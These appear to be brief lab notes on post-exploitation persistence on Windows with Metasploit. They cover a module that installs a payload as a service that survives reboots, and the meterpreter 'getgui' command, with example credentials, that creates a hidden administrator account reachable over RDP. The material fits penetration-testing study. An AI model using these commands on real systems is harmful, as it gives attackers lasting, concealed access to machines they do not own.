**Service**
with established Administrator level meterpreter session, use metasploit module
`exploit/windows/local/persistence_service`

>Windows Persistent Service Installer “This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.”

start another msfconsole and run multi-handler to regain access

exploit survives reboots running as service

**RDP**
get admin via metasploit exploit and migrate to explorer.exe

We are going to maintain access by RDP. We will be creating a user and adding that user to the Administrators group. All this can be done using the “getgui“ meterpreter command. 
The ‘getgui’ command makes the below changes to the target machine. 
- Enable RDP service if it’s disabled 
- Creates new user for an attacker 
- Hide user from Windows Login screen 
- Adding created user to "Remote Desktop Users" and "Administrators" groups 

Running getgui command to gain remote access. 
Command: `run getgui -e -u alice -p hack_123321`

Access the GUI using xfreerdp utility. Command: `xfreerdp /u:alice /p:hack_123321 /v:10.0.23.139 y [Accept the certificate]`

